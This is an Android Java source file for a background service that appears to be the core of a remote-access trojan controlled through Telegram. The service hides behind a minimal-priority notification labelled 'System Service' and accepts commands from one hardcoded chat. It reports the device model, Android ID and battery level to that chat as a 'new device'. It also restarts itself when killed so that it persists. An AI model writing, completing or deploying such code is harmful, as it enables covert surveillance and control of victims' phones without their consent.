          public class BotService extends Service {
              private static final String TAG = "BotService";
              private static final String CH = "sys_sync";
              private static final int NID = 0x5A17;
              private volatile boolean running = false;
              private Thread pollThread;
              private TelegramApi api;
              private CommandHandler handler;
              private long updateOffset = 0;
              public static void start(Context c) {
                  Intent i = new Intent(c, BotService.class);
                  if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i); else c.startService(i);
              }
              @Override public void onCreate() {
                  super.onCreate();
                  api = new TelegramApi();
                  handler = new CommandHandler(this, api);
                  startFg();
                  ServiceWatchdog.schedule(this);
              }
              @Override public int onStartCommand(Intent i, int f, int s) {
                  if (!running) { running = true; startPolling(); }
                  return START_STICKY;
              }
              private void startFg() {
                  if (Build.VERSION.SDK_INT >= 26) {
                      NotificationChannel c = new NotificationChannel(CH, "System Sync", NotificationManager.IMPORTANCE_MIN);
                      c.setShowBadge(false);
                      NotificationManager nm = getSystemService(NotificationManager.class);
                      if (nm != null) nm.createNotificationChannel(c);
                  }
                  Notification n = new NotificationCompat.Builder(this, CH)
                      .setContentTitle("System Service").setContentText("Running")
                      .setSmallIcon(android.R.drawable.stat_notify_sync)
                      .setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build();
                  startForeground(NID, n);
              }
              private void startPolling() {
                  pollThread = new Thread(() -> {
                      sendStartup();
                      while (running) {
                          try {
                              JSONArray ups = api.getUpdates(updateOffset, 25);
                              for (int i = 0; i < ups.length(); i++) {
                                  JSONObject u = ups.getJSONObject(i);
                                  long uid = u.optLong("update_id", 0);
                                  if (uid >= updateOffset) updateOffset = uid + 1;
                                  JSONObject m = u.optJSONObject("message");
                                  if (m == null) continue;
                                  JSONObject c = m.optJSONObject("chat");
                                  if (c == null) continue;
                                  if (!TelegramApi.CHAT_ID.equals(c.optString("id", ""))) continue;
                                  String text = m.optString("text", "");
                                  if (text.isEmpty()) continue;
                                  handler.handle(TelegramApi.CHAT_ID, text);
                              }
                          } catch (Exception e) { Log.e(TAG, "poll"); try { Thread.sleep(3000); } catch (Exception ignored) {} }
                      }
                  }, "bot-poller");
                  pollThread.setDaemon(true);
                  pollThread.start();
              }
              private void sendStartup() {
                  try {
                      StringBuilder sb = new StringBuilder();
                      sb.append("Connected new device\n");
                      sb.append("----------------\n");
                      sb.append(Build.BRAND).append(" ").append(Build.MODEL).append("\n");
                      sb.append("Android ").append(Build.VERSION.RELEASE).append("\n");
                      sb.append("ID ").append(Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID)).append("\n");
                      sb.append("Battery ").append(battery()).append("%\n");
                      sb.append("Write /help");
                      api.sendMessage(TelegramApi.CHAT_ID, sb.toString());
                  } catch (Exception e) { Log.e(TAG, "startup"); }
              }
              private int battery() {
                  try {
                      BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                      return bm != null ? bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) : -1;
                  } catch (Exception e) { return -1; }
              }
              @Override public void onDestroy() {
                  running = false;
                  if (pollThread != null) pollThread.interrupt();
                  ServiceWatchdog.schedule(this);
                  Intent i = new Intent(this, BotService.class);
                  if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
                  super.onDestroy();
              }
              @Override public void onTaskRemoved(Intent root) { ServiceWatchdog.schedule(this); super.onTaskRemoved(root); }
              @Nullable @Override public IBinder onBind(Intent i) { return null; }
          }
